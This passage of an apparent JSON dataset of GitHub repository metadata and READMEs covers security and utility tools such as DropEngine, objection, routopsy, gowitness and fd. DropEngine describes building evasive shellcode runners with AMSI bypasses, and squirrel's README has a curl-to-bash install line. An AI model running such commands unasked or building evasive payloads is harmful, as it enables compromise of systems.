[CONTRIBUTING](https://github.com/returntocorp/semgrep/blob/develop/CONTRIBUTING.md).\\n\\nSemgrep is a frontend to a larger program analysis library named [`pfff`](https://github.com/returntocorp/pfff/). `pfff` began and was open-sourced at [Facebook](https://github.com/facebookarchive/pfff) but is now archived. The primary maintainer now works at [r2c](https://r2c.dev). Semgrep was originally named `sgrep` and was renamed to avoid collisons with existing projects.\\n\\n## Commercial Support\\n\\nSemgrep is supported by [r2c](https://r2c.dev). We're hiring!\\n\\nInterested in a fully-supported, hosted version of Semgrep? [Drop your email](https://forms.gle/dpUUvSo1WtELL8DW6) and we'll be in touch!\\n\"", "topics": ["c", "python", "static-code-analysis", "sast", "go", "java", "static-analysis"], "writeup": "", "ignoredescription": false, "id": 78, "full_name": "returntocorp/semgrep", "url": "https://github.com/returntocorp/semgrep", "topic_string": "c python static-code-analysis sast go java static-analysis"},
{"tags": [], "owner": "s0lst1c3", "description": "DropEngine provides a malleable framework for creating shellcode runners, allowing operators to choose from a selection of components and combine them to create highly sophisticated payloads within seconds.", "name": "dropengine", "topics_string": "", "language": "Python", "readme": "\"![DropEngine](https://raw.githubusercontent.com/s0lst1c3/dropengine/master/DropEngine%201.png)\\n\\nby [@s0lst1c3](https://twitter.com/s0lst1c3)\\n\\nCurrent release: [v0.0.1-alpha](https://github.com/s0lst1c3/dropengine/releases/tag/v0.0.1-alpha)\\n\\nSupports _Python 3.7+_.\\n\\n# Overview\\n\\nDefense Evasion techniques tend to have a short shelf-life, and this is especially true for techniques used during initial access. Because of this, initial access payloads are often prepared on a per-engagement basis, which can be time-consuming when payloads are created entirely by hand. DropEngine addresses this problem by providing a malleable framework for creating shellcode runners, allowing operators to choose from a selection of components and combine them to create highly sophisticated payloads within seconds.\\n\\nAvailable payload components include crypters, execution and injection mechanisms, as well as environmental nad remote keying functions. Also included are pre-execution modules such as sandbox checks and AMSI bypasses. Although these pre-packaged example modules may prove useful, DropEngine's true strength is in its ability to improve operational efficiency by providing a high degree of payload standardization while simultaneously allowing operators to control just about every aspect of the payload's signature and behavior.\\n\\n# Disclaimer\\n\\nDropEngine (the \\\"Software\\\") and associated documentation is provided \\u201cAS IS\\u201d. The Developer makes no other warranties, express or implied, and hereby disclaims all implied warranties, including any warranty of merchantability and warranty of fitness for a particular purpose. Any actions or activities related to the use of the Software are the sole responsibility of the end user. The Developer will not be held responsible in the event that any criminal charges are brought against any individuals using or misusing the Software. It is up to the end user to use the Software in an authorized manner and to ensure that their use complies with all applicable laws and regulations.\\n\\n# Documentation\\n\\nAll documentation is available on the project's Wiki, which can be found here: https://github.com/s0lst1c3/dropengine/wiki\\n\\n# Contributing\\n\\nContributions are encouraged and more than welcome. Guidelines for creating pull requests and reporting issues can be found in [CONTRIBUTING.md](CONTRIBUTING.md).\\n\\n# Versioning\\n\\nWe use [SemVer](http://semver.org/) for versioning. For the versions available, see [https://github.com/s0lst1c3/dropengine/tags](https://github.com/s0lst1c3/dropengine/tags).\\n\\n# License\\n\\nThis project is licensed under the GNU Public License 3.0 - see the [LICENSE.md](LICENSE.md) file for details. \\n\\n# Acknowledgments\\nThis tool either builds upon, is inspired by, or directly incorporates nearly ten years of prior research and development from the following awesome people:\\n\\n* [@subtee](https://twitter.com/subtee)\\n* [secretsquirrel](https://github.com/secretsquirrel)\\n* [Antonio24](https://github.com/antonio24)\\n* [matterpreter](https://github.com/matterpreter)\\n* [dmchell](https://github.com/dmchell)\\n* [leoloobeek](https://github.com/leoloobeek) \\n* [Chris Truncer](https://twitter.com/christruncer)\\n* [Harmj0y](https://github.com/harmj0y)\\n* [byt3bl33d3r](https://github.com/byt3bl33d3r)\\n* [arvanaghi](https://github.com/arvanaghi)\\n\\nThis list will likely grow as additional functionality is added to the project.\\n\\nFor a complete description of what each of these people has contributed to the current payload development landscape and this tool, please see:\\n\\n* [https://github.com/s0lst1c3/dropengine/wiki/Acknowledgements](https://github.com/s0lst1c3/dropengine/wiki/Acknowledgements)\\n\"", "topics": [], "writeup": "", "ignoredescription": false, "id": 79, "full_name": "s0lst1c3/dropengine", "url": "https://github.com/s0lst1c3/dropengine", "topic_string": ""},
{"tags": [], "owner": "schollz", "description": "Like curl, or wget, but downloads directly go to a SQLite databse", "name": "squirrel", "topics_string": "", "language": "Go", "readme": "\"\\n<p align=\\\"center\\\">\\n<img\\n src=\\\"\\\"\\n width=\\\"408px\\\" border=\\\"0\\\" alt=\\\"squirrel\\\">\\n<br>\\n<a href=\\\"https://github.com/schollz/squirrel/releases/latest\\\"><img src=\\\"https://img.shields.io/badge/version-v1.1.0-brightgreen.svg?style=flat-square\\\" alt=\\\"Version\\\"></a>\\n<a href=\\\"https://travis-ci.org/schollz/squirrel\\\"><img\\nsrc=\\\"https://img.shields.io/travis/schollz/squirrel.svg?style=flat-square\\\" alt=\\\"Build\\nStatus\\\"></a> \\n</p>\\n\\n\\n<p align=\\\"center\\\"><code>curl https://getsquirrel.schollz.com | bash</code></p>\\n\\n\\nDownloading the web can be cumbersome if you end up with thousands or millions of files. This tool allows you to download websites directly into a file-based database in SQLite, since [SQlite performs faster than a filesystem](https://www.sqlite.org/fasterthanfs.html) for reading and writing.\\n\\n\\n## Install\\n\\nDownload [the latest release for your system](https://github.com/schollz/squirrel/releases/latest), or install a release from the command-line:\\n\\n```\\n$ curl https://getsquirrel.schollz.com | bash\\n```\\n\\nOn macOS you can install the latest release with [Homebrew](https://brew.sh/): \\n\\n```\\n$ brew install schollz/tap/squirrel\\n```\\n\\nOr, you can [install Go](https://golang.org/dl/) and build from source (requires Go 1.11+): \\n\\n```\\n$ go get -v github.com/schollz/squirrel\\n```\\n\\n\\n\\n## Usage \\n\\n### Basic usage\\n\\nIt should be compatible with Firefox's \\\"Copy as cURL\\\", just replace `curl` with `squirrel`. By default it will save the data in a database, `urls.db`.\\n\\n```\\n$ squirrel \\\"https://www.sqlite.org/fasterthanfs.html\\\" -H \\\"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0\\\" -H \\\"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\\" -H \\\"Accept-Language: en-US,en;q=0.5\\\" --compressed -H \\\"Referer: https://www.google.com/\\\" -H \\\"Connection: keep-alive\\\" -H \\\"Upgrade-Insecure-Requests: 1\\\" -H \\\"If-Modified-Since: Thu, 02 May 2019 16:25:06 +0000\\\" -H \\\"If-None-Match: \\\"\\\"m5ccb19e2s6076\\\"\\\"\\\" -H \\\"Cache-Control: max-age=0\\\"\\n```\\n\\n\\n## Contributing\\n\\nPull requests are welcome. Feel free to...\\n\\n- Revise documentation\\n- Add new features\\n- Fix bugs\\n- Suggest improvements\\n\\n## Thanks\\n\\nThanks Dr. H for the idea.\\n\\n## License\\n\\nMIT\\n\"", "topics": ["sqlite", "curl", "wget", "sqlite3", "downloading", "cli"], "writeup": "", "ignoredescription": false, "id": 80, "full_name": "schollz/squirrel", "url": "https://github.com/schollz/squirrel", "topic_string": "sqlite curl wget sqlite3 downloading cli"},
{"tags": [], "owner": "scorestack", "description": "A security competition scoring system built on the Elastic stack.", "name": "scorestack", "topics_string": "", "language": "Go", "readme": "\"Scorestack\\n==========\\n\\n![Dynamicbeat](https://github.com/scorestack/scorestack/workflows/Dynamicbeat/badge.svg)\\n![Kibana Plugin](https://github.com/scorestack/scorestack/workflows/Kibana%20Plugin/badge.svg)\\n\\nA security competition scoring system built on the Elastic stack.\\n\\nInstallation\\n------------\\n\\nPlease see the [deployment documentation](./deployment/README.md) to review your options for deploying Scorestack.\\n\\nThe administration documentation has a section on [running Dynamicbeat](./docs/administration.md#running-dynamicbeat) that provides everything you need to know in order to successfully deploy Dynamicbeat.\\n\\nThe rest of the [administration documentation](./docs/administration.md) explains some of the details of how Scorestack works under the hood, and can be a useful read for anyone responsible for Scorestack at a competition.\\n\\nWriting Checks\\n--------------\\n\\nFor information on how to write checks, please see the [checks documentation](./docs/checks.md).\\n\\nBuilding\\n--------\\n\\nPrebuilt binaries are attached to each release. If you would like to build your own binaries, please see the [building documentation](./docs/building.md).\"", "topics": ["competition", "elastic", "scoring"], "writeup": "", "ignoredescription": false, "id": 81, "full_name": "scorestack/scorestack", "url": "https://github.com/scorestack/scorestack", "topic_string": "competition elastic scoring"},
{"tags": [], "owner": "seanfisher", "description": "Play Codenames (the board game) online with friends. 4+ players required.", "name": "codenames", "topics_string": "", "language": "TypeScript", "readme": "\"# Codenames\\n\\n[![Contributor Covenant](https://img.shields.io/badge/Contributor%20Covenant-v2.0%20adopted-ff69b4.svg)](CODE_OF_CONDUCT.md)\\n\\nPlay the board game Codenames online with friends.\\n\\n## Where to Play\\n\\nPlay at [http://playcodenamesonline.com](http://playcodenamesonline.com) or host this yourself!\\n\\n## Other implementations\\n\\nI love how there are many different versions of this, each with their own flair and style. Here are some links of other versions I've collected.\\n\\n- https://codenames.game - ***NEW*** The official implementation (in beta - looks like domain was registered May 5, 2020)\\n- https://www.horsepaste.com/ (https://github.com/jbowens/codenames)\\n- https://www.codenamesgreen.com/\\n- https://netgames.io/games/codenames\\n- http://those.codes/\\n- https://www.cyberspaces.app/cyberterms\\n- https://codewords.tv/\\n- https://captnemo.in/codenames/\\n- http://codenames.roartec.com/\\n- http://www.codenames.plus\\n- https://ninjabunny.github.io/KodeNames/\\n- https://kodenames.io\\n- http://www.codewordsgame.com\\n- https://playcodenames.online\\n- http://kodenym.com/\\n- https://hackervoiceim.in\\n- https://cnames.herokuapp.com\\n- https://en.codenames.me - seems broken\\n- https://codenames.dport.me/ - Codenames pictures\\n\\n## Project architecture\\n\\nFront-end:\\n- Vuejs scaffolded with @vue/cli\\n- Socket.io client\\n- Typescript/SASS/HTML\\n- Generally standard vue-cli project structure, with public files in `/public` and source files in `src/client`\\n\\nBack-end:\\n- Simple node.js Express server\\n- Socket.io server\\n- Server code is located in `src/server`\\n\\nShared:\\n- Typescript game models (located in `src/lib`)\\n\\nGame state is maintained on the server-side in Redis and commands are sent from the client to the server. The server processes the commands based on the current game state. A locking mechanism is used to ensure game state from Redis is not subject to race conditions. Any update from the game logic causes new state to be pushed to all currently connected players.\\n\\n## Running the project\\n\\n### Project setup\\n```\\nnpm install\\n```\\n\\n### Compiles and hot-reloads for development\\n```\\nnpm run serve:client\\nnpm run serve:server\\n```\\n\\n### Compiles and minifies for production\\n```\\nnpm run build:client\\nnpm run build:server\\n```\\n\\n### Run your unit tests\\n```\\nnpm run test:unit\\n```\\n\\n### Run your end-to-end tests\\n```\\nnpm run test:e2e\\n```\\n\\n### Lints and fixes files\\n```\\nnpm run lint\\n```\\n\\n### Deploying\\n\\nThis project can be run entirely on Heroku (for free). Configure a Heroku dyno with the Redis add-on, set up your local Heroku CLI to connect, then push the code to the Heroku machine (`git push heroku master`). Everything should just work. The dyno URL will serve the front-end and act as the back-end.\\n\\nThe client and server-side will automatically be built on Heroku using the package.json `heroku-postbuild` script.\\n\\n\\n## Code of Conduct\\n\\nPlease note that this project is released with a [Contributor Code of Conduct](CODE_OF_CONDUCT.md). By participating in this project you agree to abide by its terms.\\n\"", "topics": ["game", "expressjs", "vuejs"], "writeup": "", "ignoredescription": false, "id": 82, "full_name": "seanfisher/codenames", "url": "https://github.com/seanfisher/codenames", "topic_string": "game expressjs vuejs"},
{"tags": [], "owner": "sensepost", "description": "\ud83d\udd0d gowitness - a golang, web screenshot utility using Chrome Headless", "name": "gowitness", "topics_string": "", "language": "Go", "readme": "\"<h1 align=\\\"center\\\">\\n <br>\\n <a href=\\\"https://github.com/sensepost/gowitness\\\">\\n <img src=\\\"images/gowitness-logo.png\\\" alt=\\\"gowitness\\\"></a>\\n <br>\\n <br>\\n</h1>\\n\\n<h4 align=\\\"center\\\">A golang, web screenshot utility using Chrome Headless.</h4>\\n<p align=\\\"center\\\">\\n <a href=\\\"https://twitter.com/leonjza\\\"><img src=\\\"https://img.shields.io/badge/twitter-%40leonjza-blue.svg\\\" alt=\\\"@leonjza\\\" height=\\\"18\\\"></a>\\n <a href=\\\"https://goreportcard.com/report/github.com/sensepost/gowitness\\\"><img src=\\\"https://goreportcard.com/badge/github.com/sensepost/gowitness\\\" alt=\\\"Go Report Card\\\" height=\\\"18\\\"></a>\\n <a href=\\\"https://hub.docker.com/r/leonjza/gowitness\\\"><img alt=\\\"Docker Cloud Build Status\\\" src=\\\"https://img.shields.io/docker/cloud/build/leonjza/gowitness\\\"></a>\\n</p>\\n<br>\\n\\n## introduction\\n\\n`gowitness` is a website screenshot utility written in Golang, that uses Chrome Headless to generate screenshots of web interfaces using the command line, with a handy report viewer to process results. Both Linux and macOS is supported, with Windows support mostly working.\\n\\nInspiration for `gowitness` comes from [Eyewitness](https://github.com/ChrisTruncer/EyeWitness). If you are looking for something with lots of extra features, be sure to check it out along with these [other](https://github.com/afxdub/http-screenshot-html) [projects](https://github.com/breenmachine/httpscreenshot).\\n\\n## documentation\\n\\nFor installation information and other documentation, please refer to the wiki [here](https://github.com/sensepost/gowitness/wiki).\\n\\n## license\\n\\n`gowitness` is licensed under a [GNU General Public v3 License](https://www.gnu.org/licenses/gpl-3.0.en.html). Permissions beyond the scope of this license may be available at <http://sensepost.com/contact/>.\\n\"", "topics": ["headless", "footprinting", "chrome", "security", "reporting", "screenshot"], "writeup": "", "ignoredescription": false, "id": 83, "full_name": "sensepost/gowitness", "url": "https://github.com/sensepost/gowitness", "topic_string": "headless footprinting chrome security reporting screenshot"},
{"tags": [], "owner": "sensepost", "description": "\ud83d\udcf1 objection - runtime mobile exploration", "name": "objection", "topics_string": "", "language": "Python", "readme": "\"# \\ud83d\\udcf1objection - Runtime Mobile Exploration\\n\\n`objection` is a runtime mobile exploration toolkit, powered by [Frida](https://www.frida.re/), built to help you assess the security posture of your mobile applications, without needing a jailbreak.\\n\\n[![Twitter](https://img.shields.io/badge/twitter-%40leonjza-blue.svg)](https://twitter.com/leonjza)\\n[![PyPi](https://badge.fury.io/py/objection.svg)](https://pypi.python.org/pypi/objection)\\n[![Travis](https://travis-ci.org/sensepost/objection.svg?branch=master)](https://travis-ci.org/sensepost/objection)\\n[![Black Hat Arsenal](https://raw.githubusercontent.com/toolswatch/badges/master/arsenal/europe/2017.svg?sanitize=true)](https://www.blackhat.com/eu-17/arsenal-overview.html)\\n[![Black Hat Arsenal](https://raw.githubusercontent.com/toolswatch/badges/master/arsenal/usa/2019.svg?sanitize=true)](https://www.blackhat.com/us-19/arsenal-overview.html)\\n\\n<img align=\\\"right\\\" src=\\\"./images/objection.png\\\" height=\\\"220\\\" alt=\\\"objection\\\">\\n\\n- Supports both iOS and Android.\\n- Inspect and interact with container file systems.\\n- Bypass SSL pinning.\\n- Dump keychains.\\n- Perform memory related tasks, such as dumping & patching.\\n- Explore and manipulate objects on the heap.\\n- And much, much [more](https://github.com/sensepost/objection/wiki/Features)...\\n\\nScreenshots are available in the [wiki](https://github.com/sensepost/objection/wiki/Screenshots).\\n\\n## installation\\n\\nInstallation is simply a matter of `pip3 install objection`. This will give you the `objection` command. You can update an existing `objection` installation with `pip3 install --upgrade objection`.\\n\\nFor more detailed update and installation instructions, please refer to the wiki page [here](https://github.com/sensepost/objection/wiki/Installation).\\n\\n## license\\n\\n`objection` is licensed under a [GNU General Public v3 License](https://www.gnu.org/licenses/gpl-3.0.en.html). Permissions beyond the scope of this license may be available at [http://sensepost.com/contact/](http://sensepost.com/contact/).\\n\"", "topics": ["ios", "frida", "mobile", "offensive", "instrumentation", "framework", "android", "security"], "writeup": "objection is a runtime mobile exploration toolkit, powered by Frida, built to help you assess the security posture of your mobile applications, without needing a jailbreak.", "ignoredescription": true, "id": 84, "full_name": "sensepost/objection", "url": "https://github.com/sensepost/objection", "topic_string": "ios frida mobile offensive instrumentation framework android security"},
{"tags": [], "owner": "sensepost", "description": "", "name": "routopsy", "topics_string": "", "language": "Python", "readme": "\"# routopsy\\n\\nRoutopsy is a toolkit built to attack often overlooked networking protocols. Routopsy currently supports attacks against Dynamic Routing Protocols (DRP) and First-Hop Redundancy Protocols (FHRP). Most of the attacks currently implemented make use of a weaponised 'virtual router' as opposed to implementing protocols from scratch. The tooling is not limited to the virtual routers, and allows for further attacks to be implemented in python3 or by adding additional containers.\\n\\nFor further information regarding the usage and such, refer to the Wiki @ https://github.com/sensepost/routopsy/wiki\\n\"", "topics": ["offensive", "network", "security"], "writeup": "", "ignoredescription": false, "id": 85, "full_name": "sensepost/routopsy", "url": "https://github.com/sensepost/routopsy", "topic_string": "offensive network security"},
{"tags": [], "owner": "sharkdp", "description": "A simple, fast and user-friendly alternative to 'find'", "name": "fd", "topics_string": "", "language": "Rust", "readme": "\"# fd\\n[![Build Status](https://travis-ci.org/sharkdp/fd.svg?branch=master)](https://travis-ci.org/sharkdp/fd)\\n[![Build status](https://ci.appveyor.com/api/projects/status/21c4p5fwggc5gy3j/branch/master?svg=true)](https://ci.appveyor.com/project/sharkdp/fd/branch/master)\\n[![Version info](https://img.shields.io/crates/v/fd-find.svg)](https://crates.io/crates/fd-find)\\n[\\u4e2d\\u6587](https://github.com/chinanf-boy/fd-zh)\\n[\\ud55c\\uad6d\\uc5b4](https://github.com/spearkkk/fd-kor)\\n\\n*fd* is a simple, fast and user-friendly alternative to\\n[*find*](https://www.gnu.org/software/findutils/).\\n\\nWhile it does not seek to mirror all of *find*'s powerful functionality, it provides sensible\\n(opinionated) defaults for [80%](https://en.wikipedia.org/wiki/Pareto_principle) of the use cases.\\n\\n## Features\\n* Convenient syntax: `fd PATTERN` instead of `find -iname '*PATTERN*'`.\\n* Colorized terminal output (similar to *ls*).\\n* It's *fast* (see [benchmarks](#benchmark) below).\\n* Smart case: the search is case-insensitive by default. It switches to\\n case-sensitive if the pattern contains an uppercase\\n character[\\\\*](http://vimdoc.sourceforge.net/htmldoc/options.html#'smartcase').\\n* Ignores hidden directories and files, by default.\\n* Ignores patterns from your `.gitignore`, by default.\\n* Regular expressions.\\n* Unicode-awareness.\\n* The command name is *50%* shorter[\\\\*](https://github.com/ggreer/the_silver_searcher) than\\n `find` :-).\\n* Parallel command execution with a syntax similar to GNU Parallel.\\n\\n## Demo\\n\\n![Demo](doc/screencast.svg)\\n\\n## Benchmark\\n\\nLet's search my home folder for files that end in `[0-9].jpg`. It contains ~190.000\\nsubdirectories and about a million files. For averaging and statistical analysis, I'm using\\n[hyperfine](https://github.com/sharkdp/hyperfine). The following benchmarks are performed\\nwith a \\\"warm\\\"/pre-filled disk-cache (results for a \\\"cold\\\" disk-cache show the same trends).\\n\\nLet's start with `find`:\\n```\\nBenchmark #1: find ~ -iregex '.*[0-9]\\\\.jpg$'\\n\\n Time (mean \\u00b1 \\u03c3): 7.236 s \\u00b1 0.090 s\\n\\n Range (min \\u2026 max): 7.133 s \\u2026 7.385 s\\n```\\n\\n`find` is much faster if it does not need to perform a regular-expression search:\\n```\\nBenchmark #2: find ~ -iname '*[0-9].jpg'\\n\\n Time (mean \\u00b1 \\u03c3): 3.914 s \\u00b1 0.027 s\\n\\n Range (min \\u2026 max): 3.876 s \\u2026 3.964 s\\n```\\n\\nNow let's try the same for `fd`. Note that `fd` *always* performs a regular expression\\nsearch. The options `--hidden` and `--no-ignore` are needed for a fair comparison,\\notherwise `fd` does not have to traverse hidden folders and ignored paths (see below):\\n```\\nBenchmark #3: fd -HI '.*[0-9]\\\\.jpg$' ~\\n\\n Time (mean \\u00b1 \\u03c3): 811.6 ms \\u00b1 26.9 ms\\n\\n Range (min \\u2026 max): 786.0 ms \\u2026 870.7 ms\\n```\\nFor this particular example, `fd` is approximately nine times faster than `find -iregex`\\nand about five times faster than `find -iname`. By the way, both tools found the exact\\nsame 20880 files :smile:.\\n\\nFinally, let's run `fd` without `--hidden` and `--no-ignore` (this can lead to different\\nsearch results, of course). If *fd* does not have to traverse the hidden and git-ignored\\nfolders, it is almost an order of magnitude faster:\\n```\\nBenchmark #4: fd '[0-9]\\\\.jpg$' ~\\n\\n Time (mean \\u00b1 \\u03c3): 123.7 ms \\u00b1 6.0 ms\\n\\n Range (min \\u2026 max): 118.8 ms \\u2026 140.0 ms\\n```\\n\\n**Note**: This is *one particular* benchmark on *one particular* machine. While I have\\nperformed quite a lot of different tests (and found consistent results), things might\\nbe different for you! I encourage everyone to try it out on their own. See\\n[this repository](https://github.com/sharkdp/fd-benchmarks) for all necessary scripts.\\n\\nConcerning *fd*'s speed, the main credit goes to the `regex` and `ignore` crates that are also used\\nin [ripgrep](https://github.com/BurntSushi/ripgrep) (check it out!).\\n\\n## Colorized output\\n`fd` can colorize files by extension, just like `ls`. In order for this to work, the environment\\nvariable [`LS_COLORS`](https://linux.die.net/man/5/dir_colors) has to be set. Typically, the value\\nof this variable is set by the `dircolors` command which provides a convenient configuration format\\nto define colors for different file formats.\\nOn most distributions, `LS_COLORS` should be set already. If you are on Windows or if you are looking\\nfor alternative, more complete (or more colorful) variants, see [here](https://github.com/sharkdp/vivid),\\n[here](https://github.com/seebi/dircolors-solarized) or\\n[here](https://github.com/trapd00r/LS_COLORS).\\n\\n`fd` also honors the [`NO_COLOR`](https://no-color.org/) environment variable.\\n\\n## Parallel command execution\\nIf the `-x`/`--exec` option is specified alongside a command template, a job pool will be created\\nfor executing commands in parallel for each discovered path as the input. The syntax for generating\\ncommands is similar to that of GNU Parallel:\\n\\n- `{}`: A placeholder token that will be replaced with the path of the search result\\n (`documents/images/party.jpg`).\\n- `{.}`: Like `{}`, but without the file extension (`documents/images/party`).\\n- `{/}`: A placeholder that will be replaced by the basename of the search result (`party.jpg`).\\n- `{//}`: Uses the parent of the discovered path (`documents/images`).\\n- `{/.}`: Uses the basename, with the extension removed (`party`).\\n\\n``` bash\\n# Convert all jpg files to png files:\\nfd -e jpg -x convert {} {.}.png\\n\\n# Unpack all zip files (if no placeholder is given, the path is appended):\\nfd -e zip -x unzip\\n\\n# Convert all flac files into opus files:\\nfd -e flac -x ffmpeg -i {} -c:a libopus {.}.opus\\n\\n# Count the number of lines in Rust files (the command template can be terminated with ';'):\\nfd -x wc -l \\\\; -e rs\\n```\\n\\nThe number of threads used for command execution can be set with the `--threads`/`-j` option.\\n\\n## Installation\\n\\n[![Packaging status](https://repology.org/badge/vertical-allrepos/fd-find.svg)](https://repology.org/project/fd-find/versions)\\n\\n### On Ubuntu\\n*... and other Debian-based Linux distributions.*\\n\\nIf you run Ubuntu 19.04 (Disco Dingo) or newer, you can install the\\n[officially maintained package](https://packages.ubuntu.com/fd-find):\\n```\\nsudo apt install fd-find\\n```\\nNote that the binary is called `fdfind` as the binary name `fd` is already used by another package.\\nIt is recommended that you add an `alias fd=fdfind` to your shells initialization file, in order to\\nuse `fd` in the same way as in this documentation.\\n\\nIf you use an older version of Ubuntu, you can download the latest `.deb` package from the\\n[release page](https://github.com/sharkdp/fd/releases) and install it via:\\n``` bash\\nsudo dpkg -i fd_8.1.0_amd64.deb # adapt version number and architecture\\n```\\n\\n### On Debian\\n\\nIf you run Debian Buster or newer, you can install the\\n[officially maintained Debian package](https://tracker.debian.org/pkg/rust-fd-find):\\n```\\nsudo apt-get install fd-find\\n```\\nNote that the binary is called `fdfind` as the binary name `fd` is already used by another package.\\nIt is recommended that you add an `alias fd=fdfind` to your shells initialization file, in order to\\nuse `fd` in the same way as in this documentation.\\n\\n### On Fedora\\n\\nStarting with Fedora 28, you can install `fd` from the official package sources:\\n``` bash\\ndnf install fd-find\\n```\\n\\nFor older versions, you can use this [Fedora copr](https://copr.fedorainfracloud.org/coprs/keefle/fd/) to install `fd`:\\n``` bash\\ndnf copr enable keefle/fd\\ndnf install fd\\n```\\n\\n### On Alpine Linux\\n\\nYou can install [the fd package](https://pkgs.alpinelinux.org/packages?name=fd)\\nfrom the official sources, provided you have the appropriate repository enabled:\\n```\\napk add fd\\n```\\n\\n### On Arch Linux\\n\\nYou can install [the fd package](https://www.archlinux.org/packages/community/x86_64/fd/) from the official repos:\\n```\\npacman -S fd\\n```\\n### On Gentoo Linux\\n\\nYou can use [the fd ebuild](https://packages.gentoo.org/packages/sys-apps/fd) from the official repo:\\n```\\nemerge -av fd\\n```\\n\\n### On openSUSE Linux\\n\\nYou can install [the fd package](https://software.opensuse.org/package/fd) from the official repo:\\n```\\nzypper in fd\\n```\\n\\n### On Void Linux\\n\\nYou can install `fd` via xbps-install:\\n```\\nxbps-install -S fd\\n```\\n\\n### On macOS\\n\\nYou can install `fd` with [Homebrew](https://formulae.brew.sh/formula/fd):\\n```\\nbrew install fd\\n```\\n\\n\\u2026 or with MacPorts:\\n```\\nsudo port install fd\\n```\\n\\n### On Windows\\n\\nYou can download pre-built binaries from the [release page](https://github.com/sharkdp/fd/releases).\\n\\nAlternatively, you can install `fd` via [Scoop](http://scoop.sh):\\n```\\nscoop install fd\\n```\\n\\nOr via [Chocolatey](https://chocolatey.org):\\n```\\nchoco install fd\\n```\\n\\n### On NixOS / via Nix\\n\\nYou can use the [Nix package manager](https://nixos.org/nix/) to install `fd`:\\n```\\nnix-env -i fd\\n```\\n\\n### On FreeBSD\\n\\nYou can install [the fd-find package](https://www.freshports.org/sysutils/fd) from the official repo:\\n```\\npkg install fd-find\\n```\\n\\n### From NPM\\n\\nOn linux and macOS, you can install the [fd-find](https://npm.im/fd-find) package:\\n\\n```\\nnpm install -g fd-find\\n```\\n\\n### From source\\n\\nWith Rust's package manager [cargo](https://github.com/rust-lang/cargo), you can install *fd* via:\\n```\\ncargo install fd-find\\n```\\nNote that rust version *1.36.0* or later is required.\\n\\n### From binaries\\n\\nThe [release page](https://github.com/sharkdp/fd/releases) includes precompiled binaries for Linux, macOS and Windows.\\n\\n## Development\\n```bash\\ngit clone https://github.com/sharkdp/fd\\n\\n# Build\\ncd fd\\ncargo build\\n\\n# Run unit tests and integration tests\\ncargo test\\n\\n# Install\\ncargo install\\n```\\n\\n## Command-line options\\n```\\nUSAGE:\\n fd [FLAGS/OPTIONS] [<pattern>] [<path>...]\\n\\nFLAGS:\\n -H, --hidden Search hidden files and directories\\n -I, --no-ignore Do not respect .(git|fd)ignore files\\n -s, --case-sensitive Case-sensitive search (default: smart case)\\n -i, --ignore-case Case-insensitive search (default: smart case)\\n -g, --glob Glob-based search (default: regular expression)\\n -a, --absolute-path Show absolute instead of relative paths\\n -l, --list-details Use a long listing format with file metadata\\n -L, --follow Follow symbolic links\\n -p, --full-path Search full path (default: file-/dirname only)\\n -0, --print0 Separate results by the null character\\n -h, --help Prints help information\\n -V, --version Prints version information\\n\\nOPTIONS:\\n -d, --max-depth <depth> Set maximum search depth (default: none)\\n -t, --type <filetype>... Filter by type: file (f), directory (d), symlink (l),\\n executable (x), empty (e), socket (s), pipe (p)\\n -e, --extension <ext>... Filter by file extension\\n -x, --exec <cmd> Execute a command for each search result\\n -X, --exec-batch <cmd> Execute a command with all search results at once\\n -E, --exclude <pattern>... Exclude entries that match the given glob pattern\\n -c, --color <when> When to use colors: never, *auto*, always\\n -S, --size <size>... Limit results based on the size of files.\\n --changed-within <date|dur> Filter by file modification time (newer than)\\n --changed-before <date|dur> Filter by file modification time (older than)\\n\\nARGS:\\n <pattern> the search pattern - a regular expression unless '--glob' is used (optional)\\n <path>... the root directory for the filesystem search (optional)\\n```\\n\\nThis is the output of `fd -h`. To see the full set of command-line options, use `fd --help` which\\nalso includes a much more detailed help text.\\n\\n## Tutorial\\n\\nFirst, to get an overview of all available command line options, you can either run\\n`fd -h` for a concise help message (see above) or `fd --help` for a more detailed\\nversion.\\n\\n### Simple search\\n\\n*fd* is designed to find entries in your filesystem. The most basic search you can perform is to\\nrun *fd* with a single argument: the search pattern. For example, assume that you want to find an\\nold script of yours (the name included `netflix`):\\n``` bash\\n> fd netfl\\nSoftware/python/imdb-ratings/netflix-details.py\\n```\\nIf called with just a single argument like this, *fd* searches the current directory recursively\\nfor any entries that *contain* the pattern `netfl`.\\n\\n### Regular expression search\\n\\nThe search pattern is treated as a regular expression. Here, we search for entries that start\\nwith `x` and end with `rc`:\\n``` bash\\n> cd /etc\\n> fd '^x.*rc$'\\nX11/xinit/xinitrc\\nX11/xinit/xserverrc\\n```\\n\\n### Specifying the root directory\\n\\nIf we want to search a specific directory, it can be given as a second argument to *fd*:\\n``` bash\\n> fd passwd /etc\\n/etc/default/passwd\\n/etc/pam.d/passwd\\n/etc/passwd\\n```\\n\\n### Running *fd* without any arguments\\n\\n*fd* can be called with no arguments. This is very useful to get a quick overview of all entries\\nin the current directory, recursively (similar to `ls -R`):\\n``` bash\\n> cd fd/tests\\n> fd\\ntestenv\\ntestenv/mod.rs\\ntests.rs\\n```\\n\\nIf you want to use this functionality to list all files in a given directory, you have to use\\na catch-all pattern such as `.` or `^`:\\n``` bash\\n> fd . fd/tests/\\ntestenv\\ntestenv/mod.rs\\ntests.rs\\n```\\n\\n### Searching for a particular file extension\\n\\nOften, we are interested in all files of a particular type. This can be done with the `-e` (or\\n`--extension`) option. Here, we search for all Markdown files in the fd repository:\\n``` bash\\n> cd fd\\n> fd -e md\\nCONTRIBUTING.md\\nREADME.md\\n```\\n\\nThe `-e` option can be used in combination with a search pattern:\\n``` bash\\n> fd -e rs mod\\nsrc/fshelper/mod.rs\\nsrc/lscolors/mod.rs\\ntests/testenv/mod.rs\\n```\\n\\n### Hidden and ignored files\\nBy default, *fd* does not search hidden directories and does not show hidden files in the\\nsearch results. To disable this behavior, we can use the `-H` (or `--hidden`) option:\\n``` bash\\n> fd pre-commit\\n> fd -H pre-commit\\n.git/hooks/pre-commit.sample\\n```\\n\\nIf we work in a directory that is a Git repository (or includes Git repositories), *fd* does not\\nsearch folders (and does not show files) that match one of the `.gitignore` patterns. To disable\\nthis behavior, we can use the `-I` (or `--no-ignore`) option:\\n``` bash\\n> fd num_cpu\\n> fd -I 